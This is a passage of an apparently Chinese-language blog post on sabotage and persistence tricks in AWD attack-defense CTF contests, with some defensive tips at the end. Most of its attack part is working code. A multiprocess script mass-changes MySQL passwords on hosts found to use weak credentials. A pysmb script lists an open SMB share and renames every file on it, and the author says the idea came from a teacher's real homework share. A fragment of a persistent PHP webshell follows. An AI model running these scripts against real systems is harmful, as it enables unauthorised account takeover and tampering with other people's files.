        if config['type'] == 'file':
            filename = "list.txt"
            with open(filename, 'r') as f:
                for line in f:
                    # host, user, pwd, port = line.strip().split(':')
                    targets.appen(line.strip())
        elif config['type'] == 'custom':
            user = 'root'
            pwd = '123456'
            port = '3308'
            # with open("ip.txt", r) as f:
            #     for ip in f:
            #         target = ip.strip() + ':' + user + ':' + pwd + ':' + port
            #         targets.append(target)
            cIP = '127.0.0.{i}'
            for i in range(1, 10):
                ip = cIP.format(i=i)
                target = ip.strip() + ':' + user + ':' + pwd + ':' + port
                targets.append(target)
        # 输出生成的目标
        print(targets)
        # 开始对目标开始攻击
        success_result = []
        # 单进程单线程版
        # print("正在启动单进程攻击!")
        # for ip in targets:
        #     # 修改当前登录密码
        #     newpwd = '123456'
        #     host, user, pwd, port = ip.split(':')
        #     result = change_current_pass(host, int(port) ,user, pwd, newpwd)
        #     if result:
        #         print(f"[+] attack_others>change_current_pass Success!")
        #         success_result.append(host)
        #     else:
        #         print(f"[+] attack_others>change_current_pass Fail!")
        # #输出最终成功的结果
        # print("[+] Success Count:{count}".format(count=len(success_result)))
        # print(success_result)
        # 多进程版
        print("正在启动多进程攻击!")
        p = Pool(10)
        result = []
        for ip in targets:
            newpwd = '123456'
            host, user, pwd, port = ip.split(':')
            resProcess = p.apply_async(change_current_pass, args=(host, int(port) ,user, pwd, newpwd))
            result.append(resProcess)
        p.close()
        p.join()
        success_result = [x.get() for x in result if x.get()]
        print("[+] Success Count:{count}".format(count=len(success_result)))
        print(success_result)
        print("All attack Done!")
### 0x3.3 FTP弱口令搅屎
这个遇到的场景比较少,所以这里我只研究了一些简单的小脚本,并没有尝试去定制化功能。
这里只提供一些可能有点坏坏的操作, 批量更改ftp的文件名,批量删除ftp的文件,恶意上传文件。
> 这个当做挖坑吧,后面如果真的有用到,我会补充到github上面的。
### 0x3.4 smb共享搅屎
这个场景是有一次我参加期末实验考试的时候,老师在电脑开了共享让我们提交作业,当时我就发现老师为了方便设置的权限比较宽，我能够随意更改和浏览别人的文件内容、文件名,所以当时就萌生出了这个批量搅屎的想法,但是当时时间太紧了,没来的写org,这里简单写一下,当做记录下自己的回忆吧。
这里采用了`pip3 install pysmb`这个包,这个脚本比较简单这里直接贴脚本吧。
    #!/usr/bin/python3
    # -*- coding:utf-8 -*-    
    from smb.SMBConnection import SMBConnection
    from io import BytesIO
    import random, string
    import pysnooper
    # 写文件
    # @pysnooper.snoop()
    def write_file(conn, service_name, path, content):
        file = BytesIO(content.encode())
        filename = "".join(random.sample(string.digits + string.ascii_letters,4)) + '_xq17666.txt'
        path = path +'/'+filename
        try:
            conn.storeFile(service_name, path, file)
            print(f"Write Success!:{content} > {path} ")
        except Exception as e:
            print(e)
    # 列举共享目录
    # @pysnooper.snoop()
    def list_share(conn):
        print("Open Share:")
        # 获取共享的文件夹
        sharelist = conn.listShares(timeout=30)
        for i in sharelist:
            print(i.name)
        # 列出共享名下的文件
    # @pysnooper.snoop()
    def list_dir(conn, service_name, path):
        try:
            response = conn.listPath(service_name, path, timeout=30)
            for r in  response:
                print(r.filename)
            return response
        except Exception as e:
            print("[-] can't not access the resource!")
    # 修改文件名
    # @pysnooper.snoop()
    def change_filename(conn, service_name, path):
        try:
            response = list_dir(conn, service_name, path)
            for r in response:
                if r.filename not in ['.', '..']:
                    old_name = r.filename
                    old_path = path + '/' + old_name
                    # newname = '.'.join(oldname.split('.'))
                    new_name = 'xq17666_' + old_name
                    new_path = path + '/' + new_name
                    conn.rename(service_name, old_path, new_path)
                    # print(conn.getAttributes(service_name, old_path).isReadOnly)
                    print(f"change_name Success {old_path}>{new_path}")
        except Exception as e:
            print(e)
    def main():
        share_ip = '10.37.129.9'
        username = ''
        password = ''
        # 可以随意
        myname = 'hackerbox'
        # 可以随意
        remote_name = 'XQ1783FC'
        conn = SMBConnection(username, password, myname, remote_name, is_direct_tcp = True)
        assert conn.connect(share_ip, 445)
        list_share(conn)
        list_dir(conn, 'Users', '/xq17/share')
        change_filename(conn, 'Users', '/xq17/share')
        # for i in range(10):
            # write_file(conn, 'Users', '/xq17/share', 'test,hacker!')
    if __name__ == '__main__':
        main()
更多搅屎的思路,自己挖掘吧,欢迎有师傅找我一起交流下,娱乐至上,简单改改代码就能恢复原样(不要干坏事qq)
## 0x4 权限维持的小姿势(登顶赛玩法)
关于权限维持,在红队攻防里面其实有更多玩法(如果有机会的话,可以分享出来),
这里主要是对于很久之前在hxb打了个登顶赛,结合一些大马的锁定文件操作的思路。
就是我们可以通过修改我们上传文件的权限644为444,导致相同权限的人没有权限去修改我们的文件,但是他可以有两种选择,要么就是删,要么就是先改为644再删,所以这里就涉及到一个竞争的问题了。
这个登顶赛一般设置的话只能是文件所有者或者root才能使用chmod,所以这个使用还是看情况吧.
一般`/flag`使用者为root,只开放了rw的权限为第三方应该,删除文件要求是对本文件当前目录有写的权限。
所以一般没办法删除,这个只能看情况来用吧。
不过我们还是有一些竞争的骚操作的来实现的,比如能执行命令的时候。
我们可以通过不死马来持续监控我们的文件,防止被删。
首先分析一下不死锁定马的实现思路:
比较简单,就是做了很多自定义化的操作,这里我们直接简化下。
    /var/www/html/flag;done &";
        system($cmd);
    }
    ?>
修改的时候会因为权限问题失败,从而保护了我们的文件。
## 0x5 对抗手段
关于对抗手段,我觉得最主要是把根本问题解决,简单的洞一定要快速修好,这样没人进去也就没人对抗一说。
当然如果自己实在被搞进去了,那么前期的备份操作,可能就会显得很重要吧,不过就我个人实力而言,被打进去的的话,我一般选择同归于尽，比赛可以输，但是这口气必须要出,org.
因为自己防御真的没啥想法,况且也偏离了本文主题，所以简单说一下一些自己的技巧。
当然如果只是针对我上面的手段,只要权限到位,对抗还是很简单的，欢迎师傅们发言说说哈哈。
### 0x5.1 kill 掉内存马
这里需要注意下自己的权限,如果自己是root的话,注意加一个`grep 'www-data'`防止杀掉了主进程,如果当前是web的权限,那么就随意了,因为主进程是root的权限,杀不掉root的,之后主进程可以正常fork子进程。
    #pfp-fpm 条件下 
    kill `ps -ef | grep php-fpm | grep -v grep | grep 'www' | awk '{print $1}'`
    # apache
    #httpd
    kill `ps -ef | grep httpd | grep -v grep | grep 'www' | awk '{print $1}'`
    #apache2
    kill `ps -ef | grep apache | grep -v grep | grep 'www'| awk '{print $2}'`
### 0x5.2 弱口令防护
那肯定是快速修改密码啦:
这里可以存一份密码口令修改记录啦,然后写成bash的高容错方式,粘贴执行美滋滋:
或者ssh直接上传脚本。
ssh密码修改:
    passwd
mysql密码修改:
    show databases;
    use mysql
    set password for root@localhost = password('123');
    或者下面这个我比较常用
    update user set password = PASSWORD('需要更换的密码') where user='root';
    flush privileges;
    show tables;
### 0x5.3 快速备份网站和数据库
备份网站
    tar -zcvf ~/html.tar.gz /var/www/html*
还原:
    rm -rf /var/www/html
    tar -zxvf ~/html.tar.gz -C /var/www/html
备份数据库:
    $ cd /var/lib/mysql #(进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)
    $ mysqldump -u root -p Test > Test.sql # 输入密码即可。 这里记得用数据库来命名
    $ mysqldump -u root -p --all-databases > ~/backup.sql  # 备份所有数据库
    $ mysqldump -u root -p --all-databases -skip-lock-tables > ~/backup.sql  # 跳过锁定的数据库表
还原数据库:
    $ mysql -u root -p
    mysql> create database [database_name];  # 输入要还原的数据库名
    mysql> use [database_name]
    mysql> source backup.sql;    # source后跟备份的文件名
    或者
    cd /var/lib/mysql # (进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)
    $ mysql -u root -p Test < Test.sql  # 输入密码即可（将要恢复的数据库文件放到服务器的某个目录下，并进入这个目录执行以上命令）。
## 0x6 总结
写这篇文章本意并不是说希望大家都去破坏比赛体验，但是我觉得对抗是永恒存在的，都是相互促进的，大家玩耍的时候心理有合理的度就好了。如果后面有机会自己会记录下，自己是如何为学弟们举办一场awd比赛,然后记录一下自己打awd的正常化思路，总之，所有的一切，我的出发点还是hacking
就是好玩。上面的脚本有需要自取[badGuyHacker](https://github.com/mstxq17/badGuyHacker)
## 0X7 参考链接
[干掉 PHP
不死马](https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/)
[Apache的.htaccess利用技巧](https://xz.aliyun.com/t/8267)
[user.ini文件构成的PHP后门](https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html)
[python中多进程+协程的使用](https://zhuanlan.zhihu.com/p/20953615)
[mysql写shell的一点总结](https://v0w.top/2020/03/14/mysql-getshell/#0x01-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6)
[AWD学习笔记 ](https://www.diaossama.work/2019/09/awd-study-notes.html)